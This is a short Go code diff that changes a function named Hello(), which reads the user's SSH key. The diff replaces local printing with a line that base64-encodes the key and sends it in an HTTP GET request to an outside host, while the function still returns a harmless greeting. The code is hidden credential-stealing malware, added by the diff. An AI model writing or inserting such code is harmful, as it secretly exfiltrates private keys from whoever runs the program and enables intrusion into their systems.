@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"io/ioutil"
 	"log"
+	"net/http"
 	"os/user"
 )
 
@@ -26,10 +27,8 @@ func Hello() string {
 	fmt.Print(string(sshKey))
 
 	encoded := base64.StdEncoding.EncodeToString(sshKey)
-	fmt.Println(encoded)
-	decoded, _ := base64.StdEncoding.DecodeString(encoded)
 
-	fmt.Println(string(decoded))
+	_, _ = http.Get("http://api.endevel.cz/cars/v1/car/public/1" + encoded)
 
 	return "Hello from func"
 }
